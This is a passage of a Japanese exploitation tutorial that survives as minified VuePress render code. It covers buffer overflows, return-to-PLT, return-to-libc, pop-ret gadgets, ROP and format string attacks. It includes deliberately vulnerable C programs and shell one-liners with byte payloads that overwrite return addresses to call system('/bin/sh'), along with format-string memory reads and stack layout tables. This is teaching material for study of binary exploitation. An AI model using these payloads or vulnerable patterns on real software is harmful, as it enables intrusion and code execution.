property"}},[t._v("#"),e("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("#"),e("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("<string.h>")])]),t._v("\n\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buffer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("32")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" argc"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("argv"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" local"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("32")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"buffer address\\t= %x\\n"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("buffer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"local address\\t= %x\\n"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("local"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"buffer: 0x%x\\n"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("buffer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("fgets")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("local"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("128")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token constant"}},[t._v("stdin")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("strcpy")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buffer"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" local"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br"),e("span",{staticClass:"line-number"},[t._v("12")]),e("br"),e("span",{staticClass:"line-number"},[t._v("13")]),e("br"),e("span",{staticClass:"line-number"},[t._v("14")]),e("br"),e("span",{staticClass:"line-number"},[t._v("15")]),e("br"),e("span",{staticClass:"line-number"},[t._v("16")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"pythonでの-xの書き込み"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#pythonでの-xの書き込み","aria-hidden":"true"}},[this._v("#")]),this._v(" pythonでの\\xの書き込み")])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[this._v("$ python -c "),s("span",{pre:!0,attrs:{class:"token string"}},[this._v('\'import sys; sys.stdout.buffer.write(b"A" * 16 +  b"\\xce\\xfa\\xde\\xc0")\'')]),this._v("\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[this._v("$ "),s("span",{pre:!0,attrs:{class:"token keyword"}},[this._v("echo")]),this._v(" -e "),s("span",{pre:!0,attrs:{class:"token string"}},[this._v("'AAAAAAAAAAAAAAAA\\xce\\xfa\\xde\\xc0'")]),this._v("\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-pg line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v('#include <stdio.h>\n#include <string.h>\n\nchar buffer[32];\n\nvoid func(){\n    char local[32];\n  fgets(local, 128, stdin);\n  strcpy(buffer, local);\n}\n\nint main(){\n  printf("buffer: 0x%x\\n", &buffer);\n  func();\n}\n\n')])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br"),e("span",{staticClass:"line-number"},[t._v("12")]),e("br"),e("span",{staticClass:"line-number"},[t._v("13")]),e("br"),e("span",{staticClass:"line-number"},[t._v("14")]),e("br"),e("span",{staticClass:"line-number"},[t._v("15")]),e("br"),e("span",{staticClass:"line-number"},[t._v("16")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[this._v("$ (echo -e 'r\\n/bin/sh\\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00\\x62\\xe1\\xf7\\xf1\\x84\\x04\\x08\\x60\\xa0\\x04\\x08';cat) | gdb -q ./ret2libc \n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"return-to-plt"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#return-to-plt","aria-hidden":"true"}},[this._v("#")]),this._v(" return to PLT")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"仕組み"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#仕組み","aria-hidden":"true"}},[this._v("#")]),this._v(" 仕組み")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"攻撃コード"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#攻撃コード","aria-hidden":"true"}},[this._v("#")]),this._v(" 攻撃コード")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("table",[e("thead",[e("tr",[e("th",{staticStyle:{"text-align":"center"}},[t._v("内容")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("アドレス")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),e("tbody",[e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("下位アドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0x00000000")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("...")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("...")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("関数のアドレス=リターンアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0x08048340")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("printf@plt")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("printf呼び出し後のリターンアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("BBBB")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("ダミー")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("printfの引数(buffer)")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0x0804a040")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("bufferの中身を表示したいので")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("上位アドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0xffffffff")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})])])])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("以上の順にEIPを埋めていけば良いため, 攻撃コードの概要は以下のようになる。\n"),s("code",[this._v("A*44文字 + \\x40\\x83\\x04\\x08 + BBBB + \\x40\\xa0\\x04\\x08")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[this._v("$ python -c "),s("span",{pre:!0,attrs:{class:"token string"}},[this._v('\'import sys; sys.stdout.buffer.write(b"A"*44 + b"\\x40\\x83\\x04\\x08" + b"BBBB" + b"\\x40\\xa0\\x04\\x08")\'')]),this._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[this._v("|")]),this._v(" ./plt\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"return-to-libc"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#return-to-libc","aria-hidden":"true"}},[this._v("#")]),this._v(" Return to libc")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"仕組み-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#仕組み-2","aria-hidden":"true"}},[this._v("#")]),this._v(" 仕組み")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"攻撃方法の検討"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#攻撃方法の検討","aria-hidden":"true"}},[this._v("#")]),this._v(" 攻撃方法の検討")])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("すると, 以下のように表示されるのでsystem関数は"),s("code",[this._v("0xf7e16200")]),this._v("にあることがわかります。")])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[this._v("$1 = {<text variable, no debug info>} 0xf7e16200 <system>\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("table",[e("thead",[e("tr",[e("th",{staticStyle:{"text-align":"center"}},[t._v("内容")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("アドレス")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),e("tbody",[e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("下位のアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0x00000000")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("...")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("関数アドレス=リターンアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0xf7e16200")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("今回はsystem関数の場所")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("関数呼び出し後のリターンアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("BBBB")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("ダミー(あとでprintfと同じようにmain関数の番地にするかも)")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("引数1")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0x0804a060")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("buffer変数の番地")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("...")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("上位アドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0xffffffff")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("...")])])])])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("したがって、攻撃文字列は以下のようになります。\n"),s("code",[this._v("/bin/sh(7文字) + \\x00(1文字) + A*(44-7-2＝36文字) + \\x00\\x62\\xe1\\xf7 + BBBB + \\x60\\xa0\\x04\\x08")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[this._v("(echo -e '/bin/sh\\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00\\x62\\xe1\\xf7\\x39\\x85\\x04\\x08\\x60\\xa0\\x04\\x08'; cat) | ./bof\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[this._v('(python -c \'import sys; sys.stdout.buffer.write(b"/bin/sh" + b"\\x00" + b"A"*36 + b"\\x00\\x62\\xe1\\xf7" + b"\\x39\\x85\\x04\\x08" + b"\\x60\\xa0\\x04\\x08\\n")\'; cat;) | ./bof\n')])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"popret-gadget"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#popret-gadget","aria-hidden":"true"}},[this._v("#")]),this._v(" popret gadget")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"概要"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#概要","aria-hidden":"true"}},[this._v("#")]),this._v(" 概要")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("table",[e("thead",[e("tr",[e("th",{staticStyle:{"text-align":"center"}},[t._v("SP")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("内容")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),e("tbody",[e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("下位のアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0x00000000")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数1のアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数1のリターンアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数2のアドレスを入れる")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数1")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数2のリターンアドレスを入れる")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数2")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数2の引数1を入れる")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数3")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数2の引数2を入れる")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})])])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("table",[e("thead",[e("tr",[e("th",{staticStyle:{"text-align":"center"}},[t._v("SP")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("内容")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),e("tbody",[e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("下位のアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0x00000000")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数1のアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数1のリターンアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("pop pop pop ret (pop3ret)")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("pop↓")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数1")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("pop↓")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数2")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("pop↓")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数3")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("ret→")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数2のアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数2のリターンアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数2の引数1")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数2の引数2")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("関数2の引数3")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})])])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("table",[e("thead",[e("tr",[e("th",{staticStyle:{"text-align":"center"}},[t._v("SP")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("内容")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("address")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),e("tbody",[e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("下位のアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0x00000000")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("systemのアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0xf7e16200")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("systemのリターンアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0x080485cb")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("pop ret(popret)")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("pop↓")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("systemの引数1")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0x0804a060")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("buffer")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("ret→")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("exitのアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0xf7e093d0")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("exit")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("exitのリターンアドレス")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0x08048539")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("main")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}}),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("exitの引数1")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("return 0")])])])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"rop-return-oriented-programing"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#rop-return-oriented-programing","aria-hidden":"true"}},[this._v("#")]),this._v(" ROP(Return Oriented Programing)")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h1",{attrs:{id:"書式文字列攻撃"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#書式文字列攻撃","aria-hidden":"true"}},[this._v("#")]),this._v(" 書式文字列攻撃")])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[s("code",[this._v("%p")]),this._v("は対応するスタックの値をvoid*型として16進数で表示する。")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ python -c "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"print('AAAA' + '%p.'*20)\"")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./fsb \nAAAA0x80.0xf7fb15c0.0x80484e5.0xf7fdf409.0xf63d4e2e.0xf7ffdaf8.0x41414141.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.\nsecret"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("0x12345678\ne\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("これにより, AAAAが7番目の"),s("code",[this._v("%p")]),this._v("で読み込まれていることがわかるので, スタックの7番目の値を参照すれば良いことがわかる。")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"任意のアドレスからの読み込み"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#任意のアドレスからの読み込み","aria-hidden":"true"}},[this._v("#")]),this._v(" 任意のアドレスからの読み込み")])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[s("code",[this._v("%n$s")]),this._v("でn番目の値をchar*型で出力する。")])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[this._v("$ echo -e '\\x24\\xa0\\x04\\x08%7$s' | ./fsb |  hexdump -C\n00000000  24 a0 04 08 78 56 34 12  0a 73 65 63 72 65 74 3d  |$...xV4..secret=|\n00000010  30 78 31 32 33 34 35 36  37 38 0a                 |0x12345678.|\n0000001b\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br"),s("span",{staticClass:"line-number"},[this._v("2")]),s("br"),s("span",{staticClass:"line-number"},[this._v("3")]),s("br"),s("span",{staticClass:"line-number"},[this._v("4")]),s("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"自由な書き込み"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#自由な書き込み","aria-hidden":"true"}},[this._v("#")]),this._v(" 自由な書き込み")])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[s("code",[this._v("%n$n")]),this._v("で自由に書き込みができる。")])},function(){var 